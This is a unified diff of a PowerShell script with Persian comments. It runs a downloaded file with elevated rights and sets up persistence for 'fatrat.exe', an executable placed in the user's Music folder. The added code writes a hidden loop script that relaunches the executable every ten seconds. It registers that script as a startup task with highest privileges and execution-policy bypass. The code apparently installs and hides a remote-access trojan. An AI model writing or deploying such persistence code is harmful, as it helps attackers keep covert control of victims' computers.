@@ -12,20 +12,38 @@ Start-Process -FilePath $dest -Verb RunAs
 
 
 
-# مسیر فایل exe در فولدر Music یوزر
-$exePath = Join-Path $env:USERPROFILE "Music\fatrat.exe"
-
-# اکشن اجرای برنامه
-$action = New-ScheduledTaskAction -Execute $exePath
-
-# تریگر اجرا در هر Logon
-$trigger = New-ScheduledTaskTrigger -AtLogOn
-
-# تنظیمات ری‌استارت در صورت بسته شدن برنامه
-$settings = New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Seconds 20)
-
-# ساخت یا آپدیت تسک
-Register-ScheduledTask -TaskName "MyAppAutoRun" -Action $action -Trigger $trigger -Settings $settings -Force -Description "Auto-run app from Music folder on every logon with restart if closed"
+$script = Join-Path $env:USERPROFILE "Music\ratloop.ps1"
 
 
-    
+$loopContent = @"
+\$exe = Join-Path \$env:USERPROFILE "Music\fatrat.exe"
+
+while (\$true) {
+    try {
+        Start-Process -FilePath \$exe -WindowStyle Hidden
+    }
+    catch {}
+    Start-Sleep -Seconds 10
+}
+"@
+
+
+Set-Content -Path $script -Value $loopContent -Encoding UTF8
+
+
+$action = New-ScheduledTaskAction `
+    -Execute "powershell.exe" `
+    -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script`""
+
+
+$trigger = New-ScheduledTaskTrigger -AtStartup
+
+
+Register-ScheduledTask `
+    -TaskName "FatratLoopTask" `
+    -Action $action `
+    -Trigger $trigger `
+    -RunLevel Highest `
+    -Force
+
+Write-Host "fatratlooptask"
